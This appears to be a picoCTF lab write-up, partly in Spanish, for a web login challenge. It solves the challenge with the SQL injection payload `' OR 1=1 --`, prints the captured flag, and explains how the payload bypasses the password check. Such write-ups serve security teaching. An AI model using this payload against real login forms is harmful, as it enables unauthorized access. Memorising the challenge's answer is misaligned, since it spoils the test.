## Descripción

Do you think you can log us in? Try to see if you can login!http://fickle-tempest.picoctf.net:51394.

Hunts
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
Try to think about how the website verifies your login.
## Solución

**Solución 1
```
En el campo de **username**, escribe: `' OR 1=1 --`
# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}

```

#### NOTAS
- **Prueba de error:** En el campo de usuario, escribe una sola comilla: `'`. Si al intentar entrar recibes un error interno o un mensaje de error de SQL, confirmas que es vulnerable.
- Al introducir ese texto, la consulta SQL se transforma en algo como esto: `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...';`

- **`OR 1=1`**: Como 1 siempre es igual a 1, la base de datos devuelve "verdadero" para toda la fila.
    
- **`--`**: Estos guiones (en SQL de tipo SQLite o MySQL) sirven para **comentar** el resto de la línea. Esto hace que la parte donde se verifica la contraseña sea ignorada por el servidor.